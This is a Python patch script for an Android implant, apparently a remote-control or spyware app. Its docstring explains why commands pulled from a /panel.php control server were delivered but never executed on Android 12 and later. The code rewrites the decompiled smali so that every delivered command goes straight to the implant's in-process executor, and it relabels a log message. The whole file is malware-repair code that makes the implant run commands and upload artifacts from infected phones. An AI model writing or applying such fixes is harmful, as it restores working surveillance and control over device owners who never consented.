"""Make the implant actually execute delivered commands on Android 12+.

ROOT CAUSE
----------
`sp0.e()` polls /panel.php, parses `pending_commands`, and for each command calls

    MyFirebaseMessagingService$Companion.processCommandDirect(context, cmd, map)

which builds an Intent and then, for SDK >= 26 (the phone is Android 12 / SDK 31):

    invoke-static {p0, p1}, La/h0;->n(Landroid/content/Context;Landroid/content/Intent;)V

`La/h0.n` is literally:

    invoke-virtual {p0, p1}, Landroid/content/Context;->startForegroundService(...)

The target, `MyFirebaseMessagingService`, declares **no** `foregroundServiceType`
in AndroidManifest.xml and its class hierarchy never calls `startForeground`:

    MyFirebaseMessagingService extends FirebaseMessagingService extends La/et extends Service

`La/et.onStartCommand` (smali/a/et.smali:401) does NOT use the Intent it is
handed. It calls

    invoke-virtual {p0, p1}, La/et;->getStartCommandIntent(Landroid/content/Intent;)Landroid/content/Intent;
    if-nez p2, :cond_0
    invoke-virtual {p0, p1}, La/et;->a(Landroid/content/Intent;)V     # stopSelfResult
    return p3                                                        # 2 == START_NOT_STICKY

and `FirebaseMessagingService.getStartCommandIntent` **ignores its argument** and
polls an internal ArrayDeque instead:

    invoke-static {}, La/up0;->p()La/up0;  ->  .f:ArrayDeque  ->  poll()

Nothing ever enqueues into that deque on this path (only `ServiceStarter`
enqueues, and it is not used here), so `poll()` returns null, `onStartCommand`
takes the `if-nez p2` branch, and **the command Intent is discarded**.

Then Android 12 kills the service for starting a foreground service without
calling `startForeground` within the timeout. The exception that would have
triggered the `:catchall_0` fallback (which calls `handleCommand` directly) is
never thrown, because `startForegroundService` itself succeeds -- the reaping
happens asynchronously afterwards.

Net effect, exactly matching the observed symptom:
  - commands ARE delivered (the beacon response carries them)
  - commands are NEVER executed
  - zero artifacts are ever uploaded
  - every command sits at status='sent' forever

THE FIX
-------
Delete the service-start attempt entirely and call the fallback that the sample
already ships for the restricted case. `:catchall_0`/`:goto_1` already does the
right thing -- it logs, then runs

    MyFirebaseMessagingService$Companion$processCommandDirect$1

on the IO dispatcher, and that coroutine calls
`MyFirebaseMessagingService.access$handleCommand(service, cmd, map)`.

So the patch replaces the `try { if (SDK>=26) startForegroundService else
startService } catch { fallback }` block with a direct branch to `:goto_1`.

    python3 -I fix_command_dispatch.py <decoded-dir>
"""
from __future__ import annotations

import re
import sys
from pathlib import Path

TARGET = Path("smali/com/VexR/app/services/MyFirebaseMessagingService$Companion.smali")


def main() -> int:
    root = Path(sys.argv[1] if len(sys.argv) > 1 else ".")
    path = root / TARGET
    if not path.exists():
        print(f"[!] not found: {path}")
        return 1

    src = path.read_text(encoding="utf-8")

    # The whole dispatch attempt: from :cond_0 / :try_start_0 through the
    # catchall handler that sets up the fallback coroutine. Replace the
    # startForegroundService / startService calls with an unconditional jump to
    # the existing fallback, and leave the fallback code itself untouched.
    pat = re.compile(
        r"(?P<head>    :cond_0\n    :try_start_0\n)"
        r".*?"
        r"(?P<tail>    :goto_1\n)",
        re.S,
    )
    m = pat.search(src)
    if not m:
        print("[!] could not locate the processCommandDirect dispatch block")
        return 1

    # Sanity-check that this really is the block we think it is before rewriting.
    block = m.group(0)
    for marker in ("La/h0;->n", "startService"):
        if marker not in block:
            print(f"[!] expected marker {marker!r} missing from the block; aborting")
            return 1

    body = (
        "    :cond_0\n"
        "\n"
        "    # Android 12+ reaps a foreground service that never calls\n"
        "    # startForeground(), and FirebaseMessagingService.onStartCommand drops\n"
        "    # the Intent anyway, so the command would never run. Go straight to the\n"
        "    # in-process executor the sample already ships for this case.\n"
        "    goto :goto_1\n"
        "\n"
    )
    src = src[: m.start()] + body + src[m.start("tail"):]

    # The fallback logs "startService restricted for ..." which is now misleading.
    src = src.replace(
        'const-string v1, "startService restricted for "',
        'const-string v1, "executing in IO scope (service start skipped): "',
    )

    path.write_text(src, encoding="utf-8")
    print(f"[+] patched {path}")
    print("    dispatch now jumps straight to the in-process executor")
    return 0


if __name__ == "__main__":
    sys.exit(main())
